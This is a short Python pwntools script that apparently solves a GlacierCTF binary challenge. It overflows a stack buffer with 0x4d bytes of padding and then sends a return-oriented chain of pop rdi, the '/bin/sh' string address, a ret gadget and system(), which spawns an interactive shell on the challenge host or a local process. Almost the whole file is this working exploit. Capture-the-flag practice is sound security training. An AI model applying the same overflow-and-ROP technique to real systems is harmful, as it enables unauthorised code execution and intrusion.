#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chall", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc chall.glacierctf.com 13392"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

str_sh = 0x478015
pop_rdi = 0x00476f02

payload = b"A" * 0x4d
payload += flat(
    elf.bss(0xc00),
    pop_rdi, str_sh,
    pop_rdi + 1,
    elf.sym['system']
)
io.sendline(payload)

io.interactive()
